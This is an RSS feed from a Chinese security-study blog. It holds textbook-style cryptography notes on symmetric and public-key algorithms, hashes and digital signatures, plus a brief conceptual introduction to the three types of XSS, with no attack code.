<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>My Violet Eva Garden</title>
        <link>https://kiyomijin.github.io</link>
        <description></description>
        <language>zh-CN</language>
        <pubDate>Thu, 06 Oct 2022 13:47:55 +0800</pubDate>
        <lastBuildDate>Thu, 06 Oct 2022 13:47:55 +0800</lastBuildDate>
        <category>原创</category>
        <category>G计划</category>
        <category>XSS跨站脚本攻击探究</category>
        <category>SQL注入探究</category>
        <category>数据库安全</category>
        <category>文件上传漏洞探究</category>
        <category>CTF小训</category>
        <category>Misc</category>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/10/06/G%E8%AE%A1%E5%88%92/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/</guid>
            <title>密码学基础</title>
            <link>https://kiyomijin.github.io/2022/10/06/G%E8%AE%A1%E5%88%92/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/</link>
            <category>G计划</category>
            <pubDate>Thu, 06 Oct 2022 13:47:55 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;密码学基础&#34;&gt;&lt;a href=&#34;#密码学基础&#34; class=&#34;headerlink&#34; title=&#34;密码学基础&#34;&gt;&lt;/a&gt;密码学基础&lt;/h1&gt;&lt;h2 id=&#34;分组密码学原理与应用&#34;&gt;&lt;a href=&#34;#分组密码学原理与应用&#34; class=&#34;headerlink&#34; title=&#34;分组密码学原理与应用&#34;&gt;&lt;/a&gt;分组密码学原理与应用&lt;/h2&gt;&lt;h3 id=&#34;原理&#34;&gt;&lt;a href=&#34;#原理&#34; class=&#34;headerlink&#34; title=&#34;原理&#34;&gt;&lt;/a&gt;原理&lt;/h3&gt;&lt;p&gt;对称密钥密码体制又称分组密码体制、单密钥密码体制，是 &lt;strong&gt;加密密钥&lt;/strong&gt; 和 &lt;strong&gt;解密密钥&lt;/strong&gt; &lt;code&gt;相同&lt;/code&gt;的密码体制。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;加密算法&lt;/code&gt;、&lt;code&gt;解密算法&lt;/code&gt;是&lt;mark class=&#34;hl-label red&#34;&gt;公开&lt;/mark&gt; 的。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;加密算法&lt;/code&gt;必须足够&lt;code&gt;复杂&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;其&lt;code&gt;密钥必须保密&lt;/code&gt;并且有足够大的密钥空间，从而使得攻击者在&lt;code&gt;截取密文&lt;/code&gt;和&lt;code&gt;知道加密算法&lt;/code&gt;的情况下，仍然&lt;code&gt;无法还原&lt;/code&gt;出&lt;code&gt;明文&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;假设网络中有&lt;code&gt;n个&lt;/code&gt;使用者，使用者之间共享&lt;code&gt;1个&lt;/code&gt;秘钥，则共有&lt;code&gt;n（n-1）/2个&lt;/code&gt;秘钥。&lt;/p&gt;
&lt;p&gt;分组密码典型算法有：&lt;code&gt;DES&lt;/code&gt;、&lt;code&gt;IDEA&lt;/code&gt;、&lt;code&gt;AES&lt;/code&gt;。&lt;/p&gt;
&lt;h3 id=&#34;优点&#34;&gt;&lt;a href=&#34;#优点&#34; class=&#34;headerlink&#34; title=&#34;优点&#34;&gt;&lt;/a&gt;优点&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;私钥密码算法&lt;/strong&gt;&lt;code&gt;处理速度快&lt;/code&gt;，人们常常将其用作&lt;code&gt;数据加密处理&lt;/code&gt;。&lt;/p&gt;
&lt;h3 id=&#34;缺点&#34;&gt;&lt;a href=&#34;#缺点&#34; class=&#34;headerlink&#34; title=&#34;缺点&#34;&gt;&lt;/a&gt;缺点&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;密钥&lt;code&gt;分配&lt;/code&gt;问题&lt;/li&gt;
&lt;li&gt;密钥&lt;code&gt;管理&lt;/code&gt;问题&lt;/li&gt;
&lt;li&gt;无法认证&lt;code&gt;源&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;应用&#34;&gt;&lt;a href=&#34;#应用&#34; class=&#34;headerlink&#34; title=&#34;应用&#34;&gt;&lt;/a&gt;应用&lt;/h3&gt;&lt;h4 id=&#34;DES【64-56】&#34;&gt;&lt;a href=&#34;#DES【64-56】&#34; class=&#34;headerlink&#34; title=&#34;DES【64-56】&#34;&gt;&lt;/a&gt;DES【64-56】&lt;/h4&gt;&lt;div class=&#34;note blue icon-padding simple&#34;&gt;&lt;i class=&#34;note-icon fas fa-battery-half&#34;&gt;&lt;/i&gt;&lt;p&gt;DES 是分组加密算法，能够支持64比特的明文块加密，其密钥长度为56比特。&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;&lt;code&gt;三重DES&lt;/code&gt;（Triple Data Encryption Algorithm，&lt;code&gt;TDEA&lt;/code&gt;），也称为&lt;code&gt;3DES&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;工作机制是使用DES对明文进行&lt;mark class=&#34;hl-label blue&#34;&gt;加密一解密一加密&lt;/mark&gt;  操作，即对DES加密后的密文进行解密再加密，而解密则相反。&lt;/p&gt;
&lt;p&gt;设&lt;code&gt;EK()&lt;/code&gt;和&lt;code&gt;DK()&lt;/code&gt;代表DES算法的加密和解密过程，代表DES算法使用的密钥，&lt;code&gt;I&lt;/code&gt;代表明文输入，&lt;code&gt;O&lt;/code&gt;代表密文输出。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TDEA&lt;/strong&gt; &lt;code&gt;加密&lt;/code&gt; 操作如下: &lt;mark class=&#34;hl-label blue&#34;&gt;加密一解密一加密&lt;/mark&gt; &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221006141353459.png&#34; alt=&#34;image-20221006141353459&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TDEA&lt;/strong&gt; &lt;code&gt;解密&lt;/code&gt; 操作如下: &lt;mark class=&#34;hl-label blue&#34;&gt;解密一加密一解密&lt;/mark&gt; &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221006141424648.png&#34; alt=&#34;image-20221006141424648&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;IDEA【64-128】&#34;&gt;&lt;a href=&#34;#IDEA【64-128】&#34; class=&#34;headerlink&#34; title=&#34;IDEA【64-128】&#34;&gt;&lt;/a&gt;IDEA【64-128】&lt;/h4&gt;&lt;div class=&#34;note blue icon-padding simple&#34;&gt;&lt;i class=&#34;note-icon fas fa-battery-half&#34;&gt;&lt;/i&gt;&lt;p&gt;IDEA（International Data Encryption Algorithm）是国际数据加密算法的简记，是一个分组加密处理算法，其明文和密文分组都是64比特，密钥长度为128比特。&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;该算法是由来学嘉（X.J.Lai）和Massey提出的建议标准算法，已在&lt;code&gt;PGP&lt;/code&gt;中得到应用。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;既可用于加密又可用于解密&lt;/code&gt; ，该算法的设计思想是&lt;mark class=&#34;hl-label blue&#34;&gt;混合使用来自不同代数群中的运算&lt;/mark&gt; 。&lt;/p&gt;
&lt;h4 id=&#34;AES【64-128、192、256】&#34;&gt;&lt;a href=&#34;#AES【64-128、192、256】&#34; class=&#34;headerlink&#34; title=&#34;AES【64-128、192、256】&#34;&gt;&lt;/a&gt;AES【64-128、192、256】&lt;/h4&gt;&lt;div class=&#34;note blue icon-padding simple&#34;&gt;&lt;i class=&#34;note-icon fas fa-battery-half&#34;&gt;&lt;/i&gt;&lt;p&gt;AES是确定非保密的、公开的、全球免费使用的分组密码算法。&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;特点：&lt;/p&gt;
&lt;p&gt;其密码&lt;code&gt;必须是没有密级&lt;/code&gt;的，绝不能像商业秘密那样来保护它&lt;/p&gt;
&lt;p&gt;算法的全部描述&lt;code&gt;必须公开披露&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;密码&lt;code&gt;必须可以在世界范围内免费使用&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;分组长度&lt;/code&gt;至少为&lt;code&gt;128比特&lt;/code&gt;，&lt;code&gt;密钥长度&lt;/code&gt;至少为&lt;code&gt;128、192和256比特&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;从参与AES的候选算法中，最终选择 &lt;code&gt;Rijndael&lt;/code&gt;作为 &lt;code&gt;AES&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;国产密码中的&lt;/p&gt;
&lt;h4 id=&#34;SM1【128-128】&#34;&gt;&lt;a href=&#34;#SM1【128-128】&#34; class=&#34;headerlink&#34; title=&#34;SM1【128-128】&#34;&gt;&lt;/a&gt;SM1【128-128】&lt;/h4&gt;&lt;div class=&#34;note blue icon-padding simple&#34;&gt;&lt;i class=&#34;note-icon fas fa-battery-half&#34;&gt;&lt;/i&gt;&lt;p&gt;SM1 算法是一种对称加密算法，分组长度为 128 比特，密钥长度为 128 比特。&lt;/p&gt;
&lt;/div&gt;
&lt;h4 id=&#34;SM4【128-128】&#34;&gt;&lt;a href=&#34;#SM4【128-128】&#34; class=&#34;headerlink&#34; title=&#34;SM4【128-128】&#34;&gt;&lt;/a&gt;SM4【128-128】&lt;/h4&gt;&lt;div class=&#34;note blue icon-padding simple&#34;&gt;&lt;i class=&#34;note-icon fas fa-battery-half&#34;&gt;&lt;/i&gt;&lt;p&gt;SM4 算法也是一种对称加密算法，分组长度为 128 比特，密钥长度为 128 比特。&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;加密算法与密钥扩展算法都采用32轮非线性迭代结构。&lt;/p&gt;
&lt;p&gt;数据解密和数据加密的算法结构相同，只是轮密钥的使用顺序相反，解密轮密钥是加密轮密钥的逆序。详见GM/T0002-2012《SM4分组密码算法》。&lt;/p&gt;
&lt;h4 id=&#34;数字信封（对称密钥-公钥）&#34;&gt;&lt;a href=&#34;#数字信封（对称密钥-公钥）&#34; class=&#34;headerlink&#34; title=&#34;数字信封（对称密钥+公钥）&#34;&gt;&lt;/a&gt;数字信封（对称密钥+公钥）&lt;/h4&gt;&lt;p&gt;数字信封是一种综合利用了&lt;code&gt;对称加密技术&lt;/code&gt;和&lt;code&gt;非对称加密技术&lt;/code&gt;两者的优点进行&lt;code&gt;信息安全传输&lt;/code&gt;的一种技术。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;发送方采用&lt;code&gt;对称密钥&lt;/code&gt;来&lt;code&gt;加密信息内容&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;发送方再用接收方的&lt;code&gt;公开密钥&lt;/code&gt;来&lt;code&gt;加密对称密钥&lt;/code&gt;（这部分称数字信封），将它和加密后的信息一起发送给接收方&lt;/li&gt;
&lt;li&gt;接收方先用自己的&lt;code&gt;私有密钥&lt;/code&gt;打开数字信封，得到&lt;code&gt;对称密钥&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;接收方最后使用&lt;code&gt;对称密钥&lt;/code&gt;解开加密信息。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;数字信封既发挥了对称加密算法速度快、安全性好的优点，又发挥了非对称加密算法密钥管理方便的优点。&lt;/p&gt;
&lt;h2 id=&#34;公钥密码学原理与应用&#34;&gt;&lt;a href=&#34;#公钥密码学原理与应用&#34; class=&#34;headerlink&#34; title=&#34;公钥密码学原理与应用&#34;&gt;&lt;/a&gt;公钥密码学原理与应用&lt;/h2&gt;&lt;h3 id=&#34;原理-1&#34;&gt;&lt;a href=&#34;#原理-1&#34; class=&#34;headerlink&#34; title=&#34;原理&#34;&gt;&lt;/a&gt;原理&lt;/h3&gt;&lt;p&gt;公钥密码体制，也称&lt;code&gt;非对称密码体制&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;其基本原理是：在加密和解密的过程中&lt;strong&gt;使用不同的密钥处理&lt;/strong&gt;方式。&lt;/p&gt;
&lt;p&gt;其中，&lt;code&gt;加密密钥&lt;/code&gt;可以&lt;mark class=&#34;hl-label red&#34;&gt;公开&lt;/mark&gt; ，而只需要把&lt;code&gt;解密密钥&lt;/code&gt;&lt;strong&gt;安全存放即可&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;在安全性方面，&lt;strong&gt;即使密码算法公开&lt;/strong&gt;，由加密密钥推知解密密钥也是计算不可行的。&lt;/p&gt;
&lt;h3 id=&#34;优点-1&#34;&gt;&lt;a href=&#34;#优点-1&#34; class=&#34;headerlink&#34; title=&#34;优点&#34;&gt;&lt;/a&gt;优点&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;密钥分发方便，能以公开方式分配加密密钥：如因特网中个人安全通信经常将自己的公钥发布在网页中，方便其他人用它进行安全加密&lt;/li&gt;
&lt;li&gt;密钥保管量少：所有发送方共用一个公开秘钥，只要接收方保护好解密秘钥，就能实现安全通信&lt;/li&gt;
&lt;li&gt;支持数字签名。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;有三种公钥密码体制类型被证明是安全和有效的，即&lt;code&gt;RSA&lt;/code&gt;体制、&lt;code&gt;ELGamal&lt;/code&gt;体制、&lt;code&gt;椭圆曲线&lt;/code&gt;密码体制。&lt;/p&gt;
&lt;h3 id=&#34;应用-1&#34;&gt;&lt;a href=&#34;#应用-1&#34; class=&#34;headerlink&#34; title=&#34;应用&#34;&gt;&lt;/a&gt;应用&lt;/h3&gt;&lt;h4 id=&#34;RSA【n的长度1024，长期安全2048】&#34;&gt;&lt;a href=&#34;#RSA【n的长度1024，长期安全2048】&#34; class=&#34;headerlink&#34; title=&#34;RSA【n的长度1024，长期安全2048】&#34;&gt;&lt;/a&gt;RSA【n的长度1024，长期安全2048】&lt;/h4&gt;&lt;p&gt;RSA算法是非对称算法，在RSA加密算法中，&lt;code&gt;公钥&lt;/code&gt;和&lt;code&gt;私钥&lt;/code&gt;都可以用于加密消息，&lt;strong&gt;用于 加密消息的密钥 与 用于解密消息的密钥 相反&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;RSA算法提供了一种保护网络通信和数据存储的&lt;code&gt;机密性&lt;/code&gt;、&lt;code&gt;完整性&lt;/code&gt;、&lt;code&gt;真实性&lt;/code&gt;和&lt;code&gt;不可否认性&lt;/code&gt;的方法。&lt;/p&gt;
&lt;p&gt;目前&lt;code&gt;SSH&lt;/code&gt;、&lt;code&gt;OpenPGP&lt;/code&gt;、&lt;code&gt;S/MIME&lt;/code&gt;、&lt;code&gt;SSL/TLS&lt;/code&gt;网络协议&lt;code&gt;都依赖于RSA&lt;/code&gt;进行加密和数字签名功能。&lt;/p&gt;
&lt;p&gt;RSA算法在&lt;code&gt;浏览器中使用&lt;/code&gt;，能够在不可信任的互联网中建立安全连接。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;RSA签名验证&lt;/code&gt;是&lt;code&gt;网络连接系统&lt;/code&gt;中最常见的执行操作之一。&lt;/p&gt;
&lt;p&gt;RSA算法基于&lt;mark class=&#34;hl-label blue&#34;&gt;大整数因子分解的困难性&lt;/mark&gt; &lt;/p&gt;
&lt;h5 id=&#34;RSA计算&#34;&gt;&lt;a href=&#34;#RSA计算&#34; class=&#34;headerlink&#34; title=&#34;RSA计算&#34;&gt;&lt;/a&gt;RSA计算&lt;/h5&gt;&lt;ol&gt;
&lt;li&gt;n=p*q&lt;/li&gt;
&lt;li&gt;φ(n)=(p-1)*(q-1) 求φ(n)&lt;/li&gt;
&lt;li&gt;e*d mod φ(n) =1 求e d其中之一&lt;/li&gt;
&lt;li&gt;c=m^e mod n 加密&lt;/li&gt;
&lt;li&gt;m=c^d mod n 解密&lt;/li&gt;
&lt;/ol&gt;
&lt;h5 id=&#34;字符说明&#34;&gt;&lt;a href=&#34;#字符说明&#34; class=&#34;headerlink&#34; title=&#34;字符说明&#34;&gt;&lt;/a&gt;字符说明&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;p，q为两个素数，n为p，q乘积。&lt;/li&gt;
&lt;li&gt;φ()为欧拉函数，φ(n)为小于或等于n的正整数中与n互质的数的数目【简单记住(p-1)*(q-1) 公式就行】&lt;/li&gt;
&lt;li&gt;e为随机一个整数，d也是一个数字，题中会给出e和d其中一个不用纠结，可以用公式3求出来ed其中之一&lt;/li&gt;
&lt;li&gt;mod是取余函数，例如3*5 mod 14，取余就是1&lt;/li&gt;
&lt;li&gt;c是密文，m是明文&lt;/li&gt;
&lt;li&gt;公钥为{e，n}，私钥为{d}&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;例题&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;考虑RSA密码体制，令p=3，q=11，d=7，m=5，给出密文C的计算过程。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;解:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;n = 3×11 = 33；&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;φ(n) = 2×10 = 20；&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;因为d=7, 根据e*d modφ(n) = 1；&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;求出e=3；&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;C = m^e mod n = 53 mod 33 = 26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;即:C为26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;国产密码算法&lt;/p&gt;
&lt;p&gt;国产密码算法是指由国家密码研究相关机构自主研发，具有相关知识产权的商用密码算法。&lt;/p&gt;
&lt;p&gt;1999年国务院发布实施的《商用密码管理条例》第一章第二条规定：“本条例所称商用密码，是指对不涉及国家秘密内容的信息进行加密保护或者安全认证所使用的密码技术和密码产品。”目前，已经公布的国产密码算法主要有SM1分组密码算法、SM2椭圆曲线公钥密码算法、SM3密码杂凑算法、SM4分组算法、SM9标识密码算法。各国产商用密码算法的特性统计如表3-1所示。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221006151616629.png&#34; alt=&#34;image-20221006151616629&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;SM2【椭圆素数域256】&#34;&gt;&lt;a href=&#34;#SM2【椭圆素数域256】&#34; class=&#34;headerlink&#34; title=&#34;SM2【椭圆素数域256】&#34;&gt;&lt;/a&gt;SM2【椭圆素数域256】&lt;/h4&gt;&lt;p&gt;SM2算法&lt;code&gt;基于椭圆曲线&lt;/code&gt;，应用于公钥密码系统。&lt;/p&gt;
&lt;p&gt;对于一般椭圆曲线的离散对数问题，目前只存在指数级计算复杂度的求解方法。与大数分解问题及有限域上离散对数问题相比，椭圆曲线离散对数问题的求解难度要大得多。因此，在相同安全程度的要求下，椭圆曲线密码较其他公钥密码所需的密钥规模要小得多。&lt;/p&gt;
&lt;p&gt;SM2算法可以用于数字签名、密钥交换、公钥加密。详见GM/T 0009-2012《SM2密码算法使用规范》。&lt;/p&gt;
&lt;h4 id=&#34;SM3【杂凑256】&#34;&gt;&lt;a href=&#34;#SM3【杂凑256】&#34; class=&#34;headerlink&#34; title=&#34;SM3【杂凑256】&#34;&gt;&lt;/a&gt;SM3【杂凑256】&lt;/h4&gt;&lt;p&gt;SM3杂凑算法对长度为l（1&amp;lt;24）比特的消息m，经过填充、迭代压缩，生成杂凑值，&lt;code&gt;杂凑值输出长度为256比特&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;详见GM/T0004-2012《SM3密码杂凑算法》。&lt;/p&gt;
&lt;h4 id=&#34;Hash函数&#34;&gt;&lt;a href=&#34;#Hash函数&#34; class=&#34;headerlink&#34; title=&#34;Hash函数&#34;&gt;&lt;/a&gt;Hash函数&lt;/h4&gt;&lt;p&gt;杂凑函数简称Hash函数，它能够将任意长度的信息转换成固定长度的哈希值（又称数字摘要或消息摘要），并且任意不同消息或文件所生成的哈希值是不一样的。令h表示Hash函数，则h满足下列条件：&lt;br&gt;（1）h的输入可以是任意长度的消息或文件M；&lt;br&gt;（2）h的输出的长度是固定的；&lt;br&gt;（3）给定h和M，计算h（M）是容易的；&lt;br&gt;（4）给定h的描述，找两个不同的消息M，和M2，使得h（M）=h（M2）是计算上不可行的。&lt;br&gt;Hash函数的安全性，是指在现有的计算资源下，找到一个碰撞是不可能的。Hash函数在网络安全应用中，不仅能用于保护消息或文件的完整性，而且也能用作密码信息的安全存储。&lt;br&gt;例如，网页防篡改应用。网页文件管理者首先用网页文件生成系列Hash值，并将Hash值备份存放在安全的地方。然后定时再计算这些网页文件的Hash值，如果新产生的Hash值与备份的Hash值不一样，则说明网页文件被篡改了。&lt;/p&gt;
&lt;h5 id=&#34;MD5【输入512-输出128】&#34;&gt;&lt;a href=&#34;#MD5【输入512-输出128】&#34; class=&#34;headerlink&#34; title=&#34;MD5【输入512-输出128】&#34;&gt;&lt;/a&gt;MD5【输入512-输出128】&lt;/h5&gt;&lt;p&gt;MD5（Message Digest Algorithm-5）算法是由Rivest设计的，于1992年公开，RFC1321对其进行了详细描述。&lt;/p&gt;
&lt;p&gt;MD5以&lt;code&gt;512位&lt;/code&gt;数据块为单位来处理输入，产生&lt;code&gt;128位&lt;/code&gt;的消息摘要，即&lt;strong&gt;MD5能产生128比特长度的哈希值&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;MD5使用广泛，常用在文件完整性检查。但是，据最新研究表明，MD5的安全性受到挑战，王小云教授及其研究团队提出了Hash函数快速寻找碰撞攻击的方法，相关研究工作表明MD5的安全性已经不足。&lt;/p&gt;
&lt;h5 id=&#34;SHA【输入512-输出160】&#34;&gt;&lt;a href=&#34;#SHA【输入512-输出160】&#34; class=&#34;headerlink&#34; title=&#34;SHA【输入512-输出160】&#34;&gt;&lt;/a&gt;SHA【输入512-输出160】&lt;/h5&gt;&lt;p&gt;SHA（Secure Hash Algorithm）算法由NIST开发，并在1993年作为联邦信息处理标准公布。&lt;/p&gt;
&lt;p&gt;SHA-1与MD5的设计原理类似，同样也以&lt;code&gt;512位&lt;/code&gt;数据块为单位来处理输入，产生&lt;code&gt;160位&lt;/code&gt;的哈希值，具有&lt;strong&gt;比MD5更强的安全性&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;SHA算法的安全性不断改进，已发布的版本有SHA-2、SHA-3。SHA算法产生的哈希值长度有SHA-224、SHA-256、SHA-384、SHA-512等。&lt;/p&gt;
&lt;h5 id=&#34;SM3【输入512-输出256】&#34;&gt;&lt;a href=&#34;#SM3【输入512-输出256】&#34; class=&#34;headerlink&#34; title=&#34;SM3【输入512-输出256】&#34;&gt;&lt;/a&gt;SM3【输入512-输出256】&lt;/h5&gt;&lt;p&gt;SM3 是国家密码管理局千 2010 年公布的商用密码杂凑算法标准 该算法消息分组长度为&lt;code&gt;512 比特&lt;/code&gt;，输出杂凑值长度为&lt;code&gt;256 比特&lt;/code&gt;，采用 Merkle-Damgard 结构。&lt;/p&gt;
&lt;h4 id=&#34;数字签名&#34;&gt;&lt;a href=&#34;#数字签名&#34; class=&#34;headerlink&#34; title=&#34;数字签名&#34;&gt;&lt;/a&gt;数字签名&lt;/h4&gt;&lt;p&gt;数字签名（Digital Signature）是指签名者使用私钥对待签名数据的杂凑值做密码运算得到的结果。&lt;/p&gt;
&lt;p&gt;该结果只能用签名者的公钥进行验证，用于确认待签名数据的完整性、签名者身份的真实性和签名行为的抗抵赖性。&lt;/p&gt;
&lt;p&gt;数字签名的目的是&lt;strong&gt;通过网络信息安全技术手段实现传统的纸面签字或者盖章的功能&lt;/strong&gt;，以&lt;code&gt;确认交易当事人的真实身份&lt;/code&gt;，&lt;code&gt;保证交易的安全性&lt;/code&gt;、&lt;code&gt;真实性&lt;/code&gt;和&lt;code&gt;不可抵赖性&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;数字签名具有与手写签名一样的特点，是&lt;strong&gt;可信的、不可伪造的、不可重用的、不可抵赖的&lt;/strong&gt;以及&lt;mark class=&#34;hl-label red&#34;&gt;不可修改&lt;/mark&gt; 的。&lt;/p&gt;
&lt;p&gt;数字签名至少应满足以下三个条件：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;不可否认&lt;/code&gt;。签名者事后不能否认自己的签名。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;真实性&lt;/code&gt;。接收者能验证签名，而任何其他人都不能伪造签名。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;可鉴别性&lt;/code&gt;。当双方关于签名的真伪发生争执时，第三方能解决双方之间发生的争执。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;一个数字签名方案一般由签名算法和验证算法组成。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;签名算法密钥&lt;/code&gt;是&lt;code&gt;秘密&lt;/code&gt;的，&lt;strong&gt;只有签名的人掌握&lt;/strong&gt;；而&lt;code&gt;验证算法&lt;/code&gt;则是&lt;code&gt;公开&lt;/code&gt;的，以便他人验证。&lt;/p&gt;
&lt;p&gt;典型的数字签名方案有RSA签名体制、Rabin签名体制、ElGamal签名体制和DSS（Data Signature Standard）标准。&lt;/p&gt;
&lt;p&gt;签名与加密很相似，一般是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;签名方利用&lt;code&gt;秘密密钥&lt;/code&gt;（私钥）对需签名的数据进行&lt;code&gt;加密&lt;/code&gt;，&lt;/li&gt;
&lt;li&gt;验证方利用签名者的&lt;code&gt;公开密钥&lt;/code&gt;（公钥）对签名数据做&lt;code&gt;解密&lt;/code&gt;运算。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;签名与加密的不同之处在于：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;加密&lt;/code&gt;的目的是&lt;strong&gt;保护信息不被非授权用户访问&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;签名&lt;/code&gt;的目的是&lt;strong&gt;使消息接收者辨别 【信息的发送者，是谁】，信息是否被他人篡改&lt;/strong&gt;。&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/10/05/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E6%8E%A2%E7%A9%B6/XSS%E4%BB%8B%E7%BB%8D/</guid>
            <title>XSS介绍</title>
            <link>https://kiyomijin.github.io/2022/10/05/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E6%8E%A2%E7%A9%B6/XSS%E4%BB%8B%E7%BB%8D/</link>
            <category>XSS跨站脚本攻击探究</category>
            <pubDate>Wed, 05 Oct 2022 00:56:24 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;XSS跨站脚本介绍&#34;&gt;&lt;a href=&#34;#XSS跨站脚本介绍&#34; class=&#34;headerlink&#34; title=&#34;XSS跨站脚本介绍&#34;&gt;&lt;/a&gt;XSS跨站脚本介绍&lt;/h1&gt;&lt;p&gt;跨站脚本攻击（Cross Site Scripting）是指攻击者利用网站程序对&lt;strong&gt;用户输入过滤不足&lt;/strong&gt;，输入可以显示在页面上对其他用户（普通用户、第三方用户、网站拥有者）造成影响的&lt;code&gt;HTML+Js&lt;/code&gt;代码，从而&lt;strong&gt;盗取用户资料&lt;/strong&gt;、&lt;strong&gt;利用用户身份进行某种动作&lt;/strong&gt;或者&lt;strong&gt;对访问者进行病毒侵害&lt;/strong&gt;的一种攻击方式。&lt;/p&gt;
&lt;p&gt;为了与层叠样式表（Cascading Style Sheets）的缩写CSS区分开，跨站脚本攻击通常简写为&lt;code&gt;XSS&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221004202321913.png&#34; alt=&#34;image-20221004202321913&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;反射型XSS&#34;&gt;&lt;a href=&#34;#反射型XSS&#34; class=&#34;headerlink&#34; title=&#34;反射型XSS&#34;&gt;&lt;/a&gt;反射型XSS&lt;/h2&gt;&lt;p&gt;发射型就是将应用程序的运行结果或错误返回到页面上显示。典型的反射型XSS是在搜索框里体现。&lt;/p&gt;
&lt;h2 id=&#34;存储型XSS&#34;&gt;&lt;a href=&#34;#存储型XSS&#34; class=&#34;headerlink&#34; title=&#34;存储型XSS&#34;&gt;&lt;/a&gt;存储型XSS&lt;/h2&gt;&lt;p&gt;存储在服务器、数据库（后台）上，能稳定持久执行的跨站脚本。&lt;/p&gt;
&lt;h2 id=&#34;DOM型XSS&#34;&gt;&lt;a href=&#34;#DOM型XSS&#34; class=&#34;headerlink&#34; title=&#34;DOM型XSS&#34;&gt;&lt;/a&gt;DOM型XSS&lt;/h2&gt;&lt;p&gt;能够构成HTML的DOM树的一部分，或者能够影响DOM结构的跨站脚本。&lt;/p&gt;
